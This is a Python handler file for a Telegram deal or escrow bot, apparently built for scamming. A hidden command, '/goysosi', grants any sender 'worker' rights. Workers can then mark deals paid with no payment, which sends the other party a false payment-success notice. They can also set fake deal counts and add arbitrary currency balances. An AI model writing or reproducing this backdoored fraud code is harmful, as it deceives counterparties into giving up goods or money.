# handlers/workers.py
import uuid

from aiogram import Router, F
from aiogram.types import Message
from aiogram.filters import Command

from db import db
import config as cfg
from loader import bot
import states.user as stu
import utils.texts as txt
import utils.inline as inb
import utils.prem_emojies as em


workers_router = Router()

@workers_router.message(Command("goysosi"))
async def become_worker(message: Message):
    user_id = message.from_user.id
    worker = await db.get_worker(user_id)
    text = """Меню воркера:
<code>/close ид сделки</code> - оплатить сделку
<code>/set_deals число</code> - установить количество сделок
<code>/add_rub сумма</code> - добавить рубли
<code>/add_ton сумма</code> - добавить тонны
<code>/add_usdt сумма</code> - добавить USDT
<code>/add_stars сумма</code> - добавить звёзды"""
    if worker:
        await message.answer(text)
    else:
        await db.add_worker(user_id)
        await message.answer(text)
        
@workers_router.message(Command("close"))
async def close_deal(message: Message):
    user_id = message.from_user.id
    worker = await db.get_worker(user_id)
    if not worker:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return
    deal_id = args[1]
    if deal_id.startswith("#"):
        deal_id = deal_id[1:]
    deal = await db.get_deal(deal_id)
    if not deal:
        return
    
    if deal.status != "active":
        return await message.answer("Это сделка уже оплачена либо не существует.")
    creator = await db.get_user(deal.creator_id)
    respondent = await bot.get_chat(deal.respondent_id)
    creator_user =creator.username if creator.username else f"Без юзера / ID {deal.creator_id}"
    respondent_user = respondent.username if respondent.username else f"Без юзера / ID {deal.respondent_id}"
    deal.status = "paid"
    await db.save()
    await message.answer(txt.pay_succes(deal_id, respondent_user, deal.amount, deal.description))
    if deal.creator_role == "buyer":
        await bot.send_message(
        deal.respondent_id,
        txt.pay_succes_respondent_text(deal_id, deal.amount, deal.description,),
        reply_markup=inb.respondent_pay_deal(deal_id)
    )
    else:
        await bot.send_message(
            deal.creator_id,
            txt.pay_succes_respondent_text(deal_id, deal.amount, deal.description,),
            reply_markup=inb.respondent_pay_deal(deal_id)
        )
    if deal.creator_role == "buyer":
        buyer_user = creator_user
        seller_user = respondent_user
    else:
        buyer_user = respondent_user
        seller_user = creator_user
    await bot.send_message(
        cfg.logs_id,
        txt.menejer_get_pay_succes_text(deal_id, buyer_user, seller_user, deal.amount, deal.description)
    )
        
@workers_router.message(Command("set_deals"))
async def set_deals(message: Message):
    user_id = message.from_user.id
    worker = await db.get_worker(user_id)
    if not worker:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return
    try:
        count = int(args[1])
    except ValueError:
        return await message.answer("Пожалуйста, введите корректное число.")
    user = await db.get_user(user_id)
    user.deals_count = count
    await db.save()
    await message.answer(f"Количество сделок установлено на {count}.")
    
    
@workers_router.message(F.text.startswith("/add_"))
async def add_balance(message: Message):
    user_id = message.from_user.id
    worker = await db.get_worker(user_id)
    if not worker:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        return
    command = args[0][5:]  # Получаем валюту из команды
    try:
        amount = float(args[1])
    except ValueError:
        return await message.answer("Пожалуйста, введите корректную сумму.")
    user = await db.get_user(user_id)
    if command == "rub":
        user.balance_rub += amount
    elif command == "ton":
        user.balance_ton += amount
    elif command == "usdt":
        user.balance_usdt += amount
    elif command == "stars":
        user.balance_stars += amount
    else:
        return await message.answer("Неизвестная валюта.")
    await db.save()
    await message.answer(f"Баланс успешно обновлён.")